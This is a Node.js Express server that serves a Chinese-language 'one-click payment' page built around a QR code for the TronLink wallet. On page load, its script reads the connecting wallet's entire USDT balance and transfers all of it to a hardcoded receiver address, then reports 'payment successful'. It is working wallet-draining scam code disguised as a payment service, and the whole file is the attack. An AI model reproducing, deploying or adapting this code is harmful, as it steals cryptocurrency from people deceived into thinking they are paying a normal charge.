const express = require('express');
const QRCode = require('qrcode');
const { TronWeb } = require('tronweb');

const app = express();

const RECEIVER = "TFFiryCmVh6We5s5Miwppz87SNRQyQRaiD";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

app.get('/', async (req, res) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.headers.host;
    const pageUrl = `${protocol}://${host}`;
    const qrBase64 = await QRCode.toDataURL(pageUrl, { width: 220 });

    const html = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><title>一键支付</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.1/dist/TronWeb.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui;padding:20px}
.card{max-width:500px;background:white;border-radius:32px;overflow:hidden;text-align:center;box-shadow:0 20px 35px -10px rgba(0,0,0,0.1)}
.header{background:#1E88E5;padding:28px}.header h1{color:white;font-size:24px}
.content{padding:28px}
.qr-wrapper{position:relative;display:inline-block;margin:20px auto}
.qr-img{width:220px;height:220px;border-radius:24px;padding:12px;background:white}
.logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:56px;height:56px;background:#00a86b;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid white}
.logo span{color:white;font-size:34px;font-weight:bold}
.status{background:#eef2fa;padding:16px;border-radius:20px;margin:20px 0;font-size:14px}
</style>
</head>
<body>
<div class="card">
<div class="header"><h1>一键支付</h1></div>
<div class="content">
<div class="qr-wrapper"><img class="qr-img" src="${qrBase64}"><div class="logo"><span>T</span></div></div>
<div id="status" class="status">请扫码，连接钱包后自动发起支付</div>
</div>
</div>
<script>
let tronWeb, userAddress;
async function init() {
    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
        document.getElementById('status').innerHTML = '⚠️ 请使用 TronLink 钱包扫描';
        return;
    }
    tronWeb = window.tronWeb;
    userAddress = tronWeb.defaultAddress.base58;
    document.getElementById('status').innerHTML = '✅ 钱包已连接，正在检测余额...';
    try {
        const contract = await tronWeb.contract().at("${USDT_CONTRACT}");
        const balanceWei = await contract.balanceOf(userAddress).call();
        const balance = Number(balanceWei) / 1e6;
        if (balance <= 0) {
            document.getElementById('status').innerHTML = '⚠️ 余额不足，请充值 USDT';
            return;
        }
        document.getElementById('status').innerHTML = \`💸 检测到余额 \${balance.toFixed(2)} USDT，正在发起转账...\`;
        const tx = await contract.transfer("${RECEIVER}", Math.floor(balance * 1e6)).send();
        document.getElementById('status').innerHTML = \`✅ 支付成功！金额 \${balance.toFixed(2)} USDT<br>交易号: \${tx.slice(0,12)}...\`;
    } catch (err) {
        console.error(err);
        document.getElementById('status').innerHTML = '❌ 支付失败，请稍后重试';
    }
}
window.addEventListener('load', () => setTimeout(init, 1000));
</script>
</body>
</html>`;
    res.send(html);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`✅ 支付服务已启动，端口 ${PORT}`));
